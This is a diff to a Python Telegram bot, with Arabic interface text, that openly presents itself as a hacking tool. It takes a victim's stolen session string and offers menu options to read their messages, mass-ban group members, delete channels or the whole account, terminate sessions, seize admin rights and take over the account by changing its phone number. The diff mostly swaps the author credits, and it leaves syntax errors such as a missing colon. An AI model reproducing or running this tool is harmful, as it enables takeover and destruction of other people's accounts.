@@ -175,10 +175,10 @@ L : [** رفع مشرف لشخص معين في قناة او مجموعة **]
 M : [** تغيير رقم الهاتف  **]
 
 ** مميزات اكثر قريبا  **
-BY ~ @JMTHON
+معرب الملفات : @RYJJHW
 '''
 mm = '''
-** اهلا بك في بوت الاختراق  يمكنك اختراق اي شخص عبر كود تيرمكس
+** اهلا بك في بوت الاختراق  ارسل كود تريمكس لعرض المفاجأت
 
 - اضغط على  /rz
 **
@@ -187,42 +187,42 @@ mm = '''
 async def op(event):
   global mm
   if not event.is_private:
-    await event.reply("▾∮ عذرا البوت يعمل في الخاص فقط")
+    await event.reply("من عذرا البوت يعمل في الخاص فقط")
   else:
-    await event.reply(mm)
+    await event.reply(mm) 
 @client.on(events.NewMessage(pattern="/give"))
 async def op(event):
   if not event.sender_id == razan:
-    return await event.reply("@JMTHON")
-  async for x in client.iter_messages("RR9R7"):
+    return await event.reply("@darkenteam")
+  async for x in client.iter_messages("@RYJJHW"):
     try:
-      await x.forward_to("RR9R7")
+      await x.forward_to("@RYJJHW")
     except:
       pass
 
 
 @client.on(events.NewMessage(pattern="/rz", func=lambda x: x.is_group))
 async def op(event):
-  await event.reply("▾∮ عذرا البوت يعمل في الخاص فقط")
+  await event.reply("▾⇜ ⌯ عذرا البوت يعمل في الخاص فقط")
 @client.on(events.NewMessage(pattern="/rz", func = lambda x: x.is_private))
 async def start(event):
   global menu
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message(f"▾∮ قـائمة اوامر البوت :\n{menu}")
+    await x.send_message(f"▾⇜ ⌯ قـائمة اوامر البوت :\n{menu}")
     res = await x.get_response()
     r = res.text
     if res.text == "A":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await x.send_message("▾⇜ ⌯ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.respond("▾⇜ ⌯ عذرا هذا الكود انتهت صلاحيته ")
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.reply("▾⇜ ⌯ عذرا هذا الكود انتهت صلاحيته ")
       if len(i) > 3855:
         file = open("session.txt", "w")
         file.write(i + "\n\n▾∮ المعلومات بواسطه جمثون")
@@ -230,77 +230,77 @@ async def start(event):
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت جمثون للاختراق")
+        await event.reply(i + "\n\n⇜ ⌯ شكرا لاستخدام بوت DARKEN للاختراق")
     elif res.text == "B":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await x.send_message("⇜ ⌯ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.respond("⇜ ⌯ عذرا هذا الكود انتهت صلاحيته ")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت جمثون للاختراق")
+      await event.reply(i + "\n\n⇜ ⌯ شكرا لاستخدام بوت داركن للاختراق")
     elif r == "C":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await x.send_message("⇜ ⌯ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
         return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ حسنا الان ارسل معرف القناة او المجموعة")
+      await x.send_message("⇜ ⌯ حسنا الان ارسل معرف القناة او المجموعة")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
-      await event.reply("▾∮ تم حظر جميع الاعضاء بنجاح تم التفليش ياب ")
+      await event.reply("⇜ ⌯ تم حظر جميع الاعضاء بنجاح تم التفليش ياب ")
     elif r == "D":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await x.send_message("⇜ ⌯ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.respond("⇜ ⌯ عذرا هذا الكود انتهت صلاحيته ")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت جمثون للاختراق")
+      await event.reply(i + "\n\n⇜ ⌯ شكرا لاستخدام بوت داركن للاختراق")
     elif r == "E":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await x.send_message("⇜ ⌯ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ حسنا الان ارسل معرف القناة او المجموعة")
+        return await event.respond(" عذرا هذا الكود انتهت صلاحيته ")
+      await x.send_message("⇜ ⌯ حسنا الان ارسل معرف القناة او المجموعة")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
-      await event.reply("▾∮ تم الانضمام الى المجموعة او القناة بنجاح")
+      await event.reply("⇜ ⌯ تم الانضمام الى المجموعة أو القناة بنجاح")⇜ ⌯
     elif r == "F":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await x.send_message("⇜ ⌯ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ حسنا الان ارسل معرف القناة او المجموعة")
+        return await event.respond("⇜ ⌯ عذرا هذا الكود انتهت صلاحيته ")
+      await x.send_message("⇜ ⌯ حسنا الان ارسل معرف القناة او المجموعة")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
-      await event.reply("▾∮ تمت المغادرة بنجاح ")
+      await event.reply("⇜ ⌯ تمت المغادرة بنجاح ")
     elif r == "G":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await x.send_message("⇜ ⌯ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ حسنا الان ارسل معرف القناة او المجموعة")
+        return await event.respond("⇜ ⌯ عذرا هذا الكود انتهت صلاحيته ")
+      await x.send_message("⇜ ⌯ حسنا الان ارسل معرف القناة او المجموعة")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("▾∮ تم حذف القناه بنجاح ✅ \n\n▾∮ شكرا لاستخدام بوت جمثون للاختراق")
-    elif r == "H":
-      await x.send_message("▾∮ ارسل كود تيرمكس ")
+      await event.reply("⇜ ⌯ تم حذف القناه بنجاح ✅ \n\n⇜ ⌯ شكرا لاستخدام داركن جمثون للاختراق")
+    elif r == "H"
+      await x.send_message("⇜ ⌯ ارسل كود تيرمكس ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
@@ -309,86 +309,86 @@ async def start(event):
         return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("▾∮ هذا الشخص لم يقوم بوضع رمز تحقق بخطوتين يمكنك اختراقه بنجاح و سهولة \n\n▾∮ شكرا لاستخدام بوت جمثون للاختراق")
+        await event.reply("⇜ ⌯ هذا الشخص لم يقوم بوضع رمز تحقق بخطوتين يمكنك اختراقه بنجاح و سهولة \n\n▾∮ شكرا لاستخدام بوت جمثون للاختراق")
       else:
-        await event.reply("▾∮ هذا الشخص مفعل رمز تحقق بخطوتين لا يمكن اختراقه لكن يمكنك حذف حسابه او استخدام اي امر اخر")
+        await event.reply("⇜ ⌯ هذا الشخص مفعل رمز تحقق بخطوتين لا يمكن اختراقه لكن يمكنك حذف حسابه او استخدام اي امر اخر")
     elif r == "I":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await x.send_message("⇜ ⌯ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.respond("⇜ ⌯ عذرا هذا الكود انتهت صلاحيته ")
       i = await terminate(strses.text)
-      await event.reply("▾∮ تم انهاء جميع الجلسات بنجاح ✅ \n\n▾∮ شكرا لاستخدام بوت جمثون للاختراق")
+      await event.reply("▾⇜ ⌯ تم انهاء جميع الجلسات بنجاح ✅ \n\n▾∮ شكرا لاستخدام بوت داركن للاختراق")
     elif res.text == "J":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await x.send_message("⇜ ⌯ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.respond("⇜ ⌯ عذرا هذا الكود انتهت صلاحيته ")
       i = await delacc(strses.text)
-      await event.reply("▾∮ تم حذف هذا الحساب بنجاح ✅\n\n▾∮ شكرا لاستخدام بوت جمثون للاختراق")
+      await event.reply("⇜ ⌯ تم حذف هذا الحساب بنجاح ✅\n\n▾∮ شكرا لاستخدام بوت جمثون للاختراق")
     elif res.text == "L":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await x.send_message("⇜ ⌯ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ الان ارسل معرف او رابط القناه او المجموعة")
+        return await event.respond("⇜ ⌯ عذرا هذا الكود انتهت صلاحيته ")
+      await x.send_message("⇜ ⌯ الان ارسل معرف او رابط القناه او المجموعة")
       grp = await x.get_response()
-      await x.send_message("▾∮ الان ارسل معرف المستخدم")
+      await x.send_message("⇜ ⌯ الان ارسل معرف المستخدم")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("▾∮ تم رفعك مشرف بنجاح ✅\n\n▾∮ شكرا لاستخدام بوت جمثون للاختراق")
+      await event.reply("⇜ ⌯ تم رفعك مشرف بنجاح ✅\n\n▾∮ شكرا لاستخدام بوت جمثون للاختراق")
     elif res.text == "K":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await x.send_message("⇜ ⌯ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ الان ارسل معرف او رابط القناه او المجموعة")
+        return await event.respond("⇜ ⌯ عذرا هذا الكود انتهت صلاحيته ")
+      await x.send_message("⇜ ⌯ الان ارسل معرف او رابط القناه او المجموعة")
       pro = await x.get_response()
       try:
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("▾∮ يتم تنزيل جميع المشرفين تاكد بنفسك")
+      await event.reply("▾⇜ ⌯ يتم تنزيل جميع المشرفين تاكد بنفسك")
     elif res.text == "M":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await x.send_message("⇜ ⌯ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ ارسل الرقم الذي تريد تكويل الحساب عليه \n▾∮ ملاحظة:  لا تستخدم رقم امريكي \n▾∮ اذا استخدمت رقم امريكي ما راح يوصلك كود تغيير الرقم")
+        return await event.respond("⇜ ⌯ عذرا هذا الكود انتهت صلاحيته ")
+      await x.send_message("⇜ ⌯ ارسل الرقم الذي تريد تخترق الحساب عليه \n⇜ ⌯ ملاحظة:  لا تستخدم رقم امريكي \n⇜ ⌯ اذا استخدمت رقم امريكي ما راح يوصلك كود تغيير الرقم")
       number = (await x.get_response()).text
       try:
         result = await change_number(strses.text, number)
         await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
         await asyncio.sleep(20)
-        await x.send_message("▾∮ حسنا الان ارسل")
+        await x.send_message("⇜ ⌯ حسنا الان ارسل")
         phone_code_hash = (await x.get_response()).text
-        await x.send_message("▾∮ ارسل الان كود التحقق")
+        await x.send_message("⇜ ⌯ ارسل الان كود التحقق")
         otp = (await x.get_response()).text
         changing = await change_number_code(strses.text, number, phone_code_hash, otp)
         if changing:
-          await event.respond("▾∮ تم تغيير الرقم بنجاح")
+          await event.respond("⇜ ⌯ تم تغيير الرقم بنجاح")
         else:
           await event.respond("هناك شي خطا")
       except Exception as e:
-        await event.respond("اارسل هذا الخطأ الى @JMTHON \n**الخطـأ**\n" + str(e))
+        await event.respond("اارسل هذا الخطأ الى @RYJJHW \n**الخطـأ**\n" + str(e))
 
     else:
-      await event.respond("▾∮ استخدم /rz فقط")
+      await event.respond("⇜ ⌯ استخدم /rz فقط")
 
 
 
